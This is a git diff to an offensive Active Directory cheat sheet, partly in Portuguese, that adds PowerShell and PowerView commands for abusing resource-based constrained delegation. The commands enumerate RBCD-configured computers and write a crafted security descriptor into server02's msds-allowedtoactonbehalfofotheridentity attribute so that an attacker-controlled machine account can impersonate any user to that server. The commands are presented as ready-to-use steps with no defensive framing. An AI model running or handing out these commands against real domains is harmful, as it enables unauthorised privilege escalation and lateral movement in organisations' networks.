@@ -1503,6 +1503,10 @@ Another important difference from this Constrained Delegation to the other deleg
 
 If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
 
+##### RESOURCE-BASED CONSTRAINED DELEGATION - LISTAR OBJETOS COM DELEGAÇÃO RBCD CONFIGURADA
+```
+Get-ADComputer -Filter * -Properties * | ?{$_.PrincipalsAllowedToDelegateToAccount -ne "$null"} | select samaccountname, PrincipalsAllowedToDelegateToAccount 
+```
 ##### RESOURCE-BASED CONSTRAINED DELEGATION - LISTAR QUANTOS COMPUTADORES UM USUARIO PODE ADICIONAR NO DOMINIO
 ```
 Get-ADObject -Identity "DC=TECH,DC=LOCAL" -Properties MS-DS-MachineAccountQuota
@@ -1558,10 +1562,37 @@ Get-DomainComputer ATTACKER2
 ```
 Set-ADComputer server02 -PrincipalsAllowedToDelegateToAccount ATTACKER2$
 ```
+OU POWERVIEW
+```
+$ComputerSid = Get-DomainComputer ATTACKER2 -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer server02 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
 ##### RESOURCE-BASED CONSTRAINED DELEGATION - VERIFICAR DELEGAÇÃO RBCD
 ```
 Get-ADComputer server02 -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer server02 -Properties PrincipalsAllowedToDelegateToAccount | select samaccountname, PrincipalsAllowedToDelegateToAccount 
+Get-ADComputer -Filter * -Properties * | ?{$_.PrincipalsAllowedToDelegateToAccount -ne "$null"} | select samaccountname, PrincipalsAllowedToDelegateToAccount 
 ```
+OU POWERVIEW - VALORES ESTRANHOS
+```
+Get-DomainComputer server02 -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
